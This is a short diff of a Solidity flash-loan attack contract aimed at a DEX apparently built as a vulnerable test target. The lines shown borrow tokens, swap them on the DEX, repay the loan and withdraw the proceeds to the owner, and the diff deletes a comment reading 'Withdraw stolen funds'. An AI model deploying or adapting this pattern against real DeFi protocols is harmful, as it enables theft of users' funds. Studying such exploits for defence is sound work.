@@ -53,10 +53,10 @@ contract FlashLoanAttacker {
         require(msg.sender == address(flashLoanProvider), "bad caller");
 
 
-        tokenA.transfer(address(dex), 0); // no-op, ensures dex address touched
-        tokenA.transferFrom(msg.sender, address(this), 0); // compatibility no-op
+        tokenA.transfer(address(dex), 0);
+        tokenA.transferFrom(msg.sender, address(this), 0);
 
-        uint256 tokenBReceived = dex.swapAForB(amount);
+        uint256 tokenBReceived = IVulnerableDEX(dex).swapAForB(amount);
 
         require(
             tokenA.transfer(address(flashLoanProvider), amount),
@@ -64,7 +64,6 @@ contract FlashLoanAttacker {
         );
     }
 
-    /// Withdraw stolen funds
     function withdraw() external {
         require(msg.sender == owner, "not owner");
         tokenB.transfer(owner, tokenB.balanceOf(address(this)));
